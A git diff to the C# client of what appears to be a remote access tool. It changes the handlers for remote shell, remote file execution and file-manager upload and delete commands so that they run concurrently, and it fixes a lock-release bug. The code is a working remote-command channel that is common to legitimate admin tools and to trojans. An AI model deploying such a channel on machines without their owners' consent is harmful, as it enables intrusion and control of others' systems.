@@ -166,15 +166,15 @@ internal class TlsClient : IDisposable
                     break;
 
                 case PacketType.RemoteShell:
-                    await HandleShell(packet.Data, ct, PacketType.ShellOutput);
+                    _ = HandleShell(packet.Data, ct, PacketType.ShellOutput);
                     break;
 
                 case PacketType.AutoTaskShell:
-                    await HandleShell(packet.Data, ct, PacketType.AutoTaskShellOutput);
+                    _ = HandleShell(packet.Data, ct, PacketType.AutoTaskShellOutput);
                     break;
 
                 case PacketType.RemoteFileExec:
-                    await HandleFileExec(packet.Data, ct);
+                    _ = HandleFileExec(packet.Data, ct);
                     break;
 
                 case PacketType.RdpStart:
@@ -312,13 +312,24 @@ internal class TlsClient : IDisposable
                 case PacketType.FmUpload:
                     var fmUp = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.FmUploadDataStub);
                     if (fmUp != null)
-                        _ = WritePacketAsync(new Packet { Type = PacketType.FmAck, Data = FileManagerFeature.UploadFile(fmUp.Path, fmUp.Data) }, ct);
+                    {
+                        var fmUpPath = fmUp.Path;
+                        var fmUpData = fmUp.Data;
+                        _ = Task.Run(async () => await WritePacketAsync(
+                            new Packet { Type = PacketType.FmAck, Data = FileManagerFeature.UploadFile(fmUpPath, fmUpData) },
+                            CancellationToken.None));
+                    }
                     break;
 
                 case PacketType.FmDelete:
                     var fmDel = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.FmDeleteDataStub);
                     if (fmDel != null)
-                        _ = WritePacketAsync(new Packet { Type = PacketType.FmAck, Data = FileManagerFeature.Delete(fmDel.Path) }, ct);
+                    {
+                        var fmDelPath = fmDel.Path;
+                        _ = Task.Run(async () => await WritePacketAsync(
+                            new Packet { Type = PacketType.FmAck, Data = FileManagerFeature.Delete(fmDelPath) },
+                            CancellationToken.None));
+                    }
                     break;
 
                 case PacketType.FmRename:
@@ -1417,9 +1428,11 @@ internal class TlsClient : IDisposable
     private async Task WritePacketAsync(Packet packet, CancellationToken ct)
     {
         if (_ssl == null) return;
-        await _writeLock.WaitAsync(ct);
+        bool acquired = false;
         try
         {
+            await _writeLock.WaitAsync(ct);
+            acquired = true;
             var json = JsonSerializer.Serialize(packet, SeroJson.Default.Packet);
             var jsonBytes = Encoding.UTF8.GetBytes(json);
             var lengthBytes = BitConverter.GetBytes(jsonBytes.Length);
@@ -1427,7 +1440,7 @@ internal class TlsClient : IDisposable
             await _ssl.WriteAsync(jsonBytes, ct);
             await _ssl.FlushAsync(ct);
         }
-        finally { _writeLock.Release(); }
+        finally { if (acquired) _writeLock.Release(); }
     }
 
     private async Task<Packet?> ReadPacketAsync(CancellationToken ct)
